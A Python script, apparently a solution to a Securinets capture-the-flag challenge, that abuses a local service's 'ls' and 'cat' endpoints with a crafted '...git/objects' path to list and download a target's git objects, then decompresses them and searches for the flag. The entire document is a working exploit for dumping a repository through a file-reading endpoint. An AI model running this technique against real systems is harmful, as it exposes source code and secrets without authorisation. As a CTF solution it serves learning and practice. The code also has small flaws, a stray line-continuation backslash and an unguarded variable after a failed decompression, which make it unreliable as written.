from os import listdir, path
import requests, re, zlib\

url = "http://localhost:1400/"
commit_list = []
request = requests.get(url + "ls?q=...git/objects")
objects = re.findall("\w+", request.text)

if request.status_code == 200:
    for obj in objects:
        get_commit = requests.get(url + "ls?q=...git/objects/" + obj + "/")
        commits = re.findall("\w+", get_commit.text)
        for commit in commits:
            get_blob = requests.get(url + "cat?q=...git/objects/" + obj + "/" + commit)
            with open(commit + ".zlib", "wb") as f:
                f.write(get_blob.content)

for blob in listdir("."):
    with open(blob, "rb") as f:
        blob_content = f.read()
    f.close()
    try:
        decompressed_blob = zlib.decompress(blob_content)
    except zlib.error as e:
        print(f"Zlib error: {e}")
    flag = re.search("Securinets.*", str(decompressed_blob))
    if flag:
        print(flag.group())
